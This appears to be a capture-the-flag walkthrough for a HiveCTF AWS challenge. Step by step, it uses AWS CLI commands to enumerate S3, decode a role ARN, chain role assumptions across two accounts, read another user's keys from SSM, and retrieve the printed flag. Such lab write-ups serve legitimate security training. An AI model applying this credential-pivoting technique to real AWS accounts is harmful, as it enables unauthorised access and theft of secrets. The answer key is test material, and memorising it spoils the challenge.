# Challenge 5: Queen's Gambit -- Walkthrough

## Overview

This challenge requires a multi-step cross-account pivot through two AWS accounts.
The attack chain: Scout (Account 1) -> Liaison role (Account 2) -> Decoder Lambda ->
Intel Reader role (Account 2) -> SSM Parameters -> Queen creds (Account 1) -> Flag.

## Step 1: Configure Scout Credentials

Set up a profile for the provided scout credentials.

```bash
aws configure --profile scout
# Enter the provided Access Key ID and Secret Access Key
# Region: us-east-1
# Output: json
```

Verify identity:

```bash
aws sts get-caller-identity --profile scout
```

Expected output: User ARN `arn:aws:iam::<ACCOUNT_1_ID>:user/hivectf-ch5-scout`

## Step 2: Discover S3 Access

Enumerate what the scout can do. Since the challenge hints at a "mission briefing",
try listing S3 buckets:

```bash
aws s3 ls --profile scout
```

The scout has `s3:ListAllMyBuckets` permission, so this reveals all buckets in Account 1.
Look for one matching `hivectf-ch5-mission-briefing-*`.

```
2026-04-04 12:00:00 hivectf-ch5-mission-briefing-a1b2c3d4
```

## Step 3: Read the Mission Briefing

```bash
aws s3 ls s3://hivectf-ch5-mission-briefing-XXXXXXXX/ --profile scout
aws s3 cp s3://hivectf-ch5-mission-briefing-XXXXXXXX/briefing.txt - --profile scout
```

The briefing reveals:
- This is "Operation Queen's Gambit"
- There's an allied hive "across the border" (Account 2)
- The passphrase is **pollenpath**
- Intel about the cross-border contact is in the intel/ directory
- There is a decoding apparatus (Lambda) that requires the passphrase

## Step 4: Decode the Cross-Border Contact

```bash
aws s3 cp s3://hivectf-ch5-mission-briefing-XXXXXXXX/intel/cross-border-contact.txt - --profile scout
```

This returns a base64-encoded string. Decode it:

```bash
aws s3 cp s3://hivectf-ch5-mission-briefing-XXXXXXXX/intel/cross-border-contact.txt - --profile scout | base64 -d
```

Result: `arn:aws:iam::<ACCOUNT_2_ID>:role/hivectf-ch5-liaison`

This is a role ARN in Account 2 (<ACCOUNT_2_ID>).

## Step 5: Assume the Liaison Role (Pivot to Account 2)

```bash
aws sts assume-role \
  --role-arn "arn:aws:iam::<ACCOUNT_2_ID>:role/hivectf-ch5-liaison" \
  --role-session-name "queen-gambit" \
  --profile scout
```

Export the temporary credentials:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId from response>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from response>
export AWS_SESSION_TOKEN=<SessionToken from response>
```

Or configure a new profile:

```bash
aws configure --profile liaison
# Set the access key, secret key
# Then manually add session token to ~/.aws/credentials
```

Verify:

```bash
aws sts get-caller-identity
```

Expected: `arn:aws:sts::<ACCOUNT_2_ID>:assumed-role/hivectf-ch5-liaison/queen-gambit`

## Step 6: Find and Invoke the Decoder Lambda

List Lambda functions:

```bash
aws lambda list-functions --region us-east-1
```

Find `hivectf-ch5-decoder`. Invoke it with the passphrase:

```bash
# AWS CLI v2 (default) - use --cli-binary-format for raw JSON payload
aws lambda invoke \
  --function-name hivectf-ch5-decoder \
  --payload '{"passphrase": "pollenpath"}' \
  --cli-binary-format raw-in-base64-out \
  --region us-east-1 \
  /dev/stdout
```

Response:

```json
{
  "statusCode": 200,
  "body": "{\"message\": \"The queen acknowledges your presence.\", \"parameters\": [\"/hivectf/queen/key-id\", \"/hivectf/queen/secret-key\"], \"hint\": \"These parameters hold the keys to the kingdom. But you may need different clearance to read them.\"}"
}
```

## Step 7: Discover You Cannot Read SSM Parameters

Try to read the SSM parameters with the liaison role:

```bash
aws ssm get-parameter --name "/hivectf/queen/key-id" --with-decryption --region us-east-1
```

**This fails!** The liaison role doesn't have SSM permissions.

## Step 8: Discover the Intel Reader Role (Role Chain)

The hint says "you may need different clearance." Investigate what else the liaison
role can do. Check if there are other roles to assume:

```bash
# Try to list IAM roles (this will likely fail)
aws iam list-roles --region us-east-1
```

**Key insight:** The Lambda hint says "Try enumerating what roles exist in this account."
The liaison role has `iam:ListRoles`, so enumerate:

```bash
aws iam list-roles --query "Roles[?starts_with(RoleName, 'hivectf-ch5')].[RoleName,Arn]" --output table
```

This reveals `hivectf-ch5-intel-reader`. Assume it:

```bash
aws sts assume-role \
  --role-arn "arn:aws:iam::<ACCOUNT_2_ID>:role/hivectf-ch5-intel-reader" \
  --role-session-name "intel-read"
```

Export the new credentials (replacing the liaison ones):

```bash
export AWS_ACCESS_KEY_ID=<new AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<new SecretAccessKey>
export AWS_SESSION_TOKEN=<new SessionToken>
```

Verify:

```bash
aws sts get-caller-identity
```

Expected: `arn:aws:sts::<ACCOUNT_2_ID>:assumed-role/hivectf-ch5-intel-reader/intel-read`

## Step 9: Read SSM Parameters (Queen's Credentials)

```bash
aws ssm get-parameter --name "/hivectf/queen/key-id" --with-decryption --region us-east-1
aws ssm get-parameter --name "/hivectf/queen/secret-key" --with-decryption --region us-east-1
```

These return the access key ID and secret access key for `hivectf-ch5-queen` in Account 1.

## Step 10: Use Queen's Credentials to Get the Flag

Configure a new profile for the queen:

```bash
aws configure --profile queen
# Access Key ID: <from SSM /hivectf/queen/key-id>
# Secret Access Key: <from SSM /hivectf/queen/secret-key>
# Region: us-east-1
```

**Important:** Clear any exported environment variables first:

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

Retrieve the flag:

```bash
aws secretsmanager get-secret-value \
  --secret-id "hivectf/challenge5/flag" \
  --region us-east-1 \
  --profile queen
```

## Flag

```
HiveCTF{cr0ss_4cc0unt_p1v0t_qu33n_t4k3s_4ll}
```

## Attack Chain Summary

```
hivectf-ch5-scout (Account 1 IAM User)
  |
  |-- S3: Read briefing.txt -> discover passphrase "pollenpath"
  |-- S3: Read intel/cross-border-contact.txt -> base64 decode -> liaison role ARN
  |
  |-- sts:AssumeRole -> hivectf-ch5-liaison (Account 2 IAM Role)
       |
       |-- lambda:ListFunctions -> find hivectf-ch5-decoder
       |-- lambda:Invoke hivectf-ch5-decoder {"passphrase":"pollenpath"}
       |   -> returns SSM parameter paths
       |
       |-- sts:AssumeRole -> hivectf-ch5-intel-reader (Account 2 IAM Role)
            |
            |-- ssm:GetParameter /hivectf/queen/key-id
            |-- ssm:GetParameter /hivectf/queen/secret-key
            |   -> returns Queen's AWS credentials
            |
            |-- Use Queen creds back in Account 1
                 |
                 hivectf-ch5-queen (Account 1 IAM User)
                   |-- secretsmanager:GetSecretValue
                   |   -> HiveCTF{cr0ss_4cc0unt_p1v0t_qu33n_t4k3s_4ll}
```

## Common Pitfalls

1. **Forgetting to unset environment variables** when switching between roles/users
2. **Not decoding the base64** in cross-border-contact.txt
3. **Missing the passphrase** "pollenpath" in the briefing narrative
4. **Not realizing the liaison role can't read SSM** -- need the intel-reader role
5. **Discovering the intel-reader role** -- this is the hardest part; requires
   enumeration or guessing the role name pattern
6. **Region confusion** -- all resources are in us-east-1
